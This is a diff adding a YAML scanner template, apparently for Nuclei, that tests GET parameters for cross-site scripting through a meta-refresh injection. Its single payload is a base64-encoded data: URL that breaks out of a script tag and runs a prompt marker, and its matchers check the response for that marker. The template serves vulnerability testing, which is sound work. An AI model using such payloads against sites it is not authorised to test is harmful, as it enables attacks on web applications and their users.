@@ -1,0 +1,37 @@
+id: xss-metadata
+
+info:
+  name: XSS in Metadata GET Parameters
+  author: reewardius
+  severity: medium
+  reference: https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      xss:
+        - '0;data:text/html;base64,Ij48L3NjcmlwdD48c2NyaXB0PnByb21wdCgiMSIpPC9zY3JpcHQ+"HTTP-EQUIV="refresh"'
+        
+    fuzzing:
+      - part: query
+        mode: single
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<script>prompt("1")</script>'
+          
+      - type: word
+        part: header
+        words:
+          - text/html
